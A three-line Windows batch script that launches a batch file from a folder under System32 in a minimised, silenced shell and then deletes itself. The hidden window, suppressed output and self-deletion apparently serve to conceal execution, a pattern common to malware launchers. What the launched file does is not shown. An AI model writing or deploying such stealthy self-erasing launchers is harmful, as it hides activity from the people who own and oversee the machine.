@ECHO OFF
START /MIN CMD /C CALL "%WinDir%\System32\NUT\run.bat" >NUL 2>&1
DEL %0
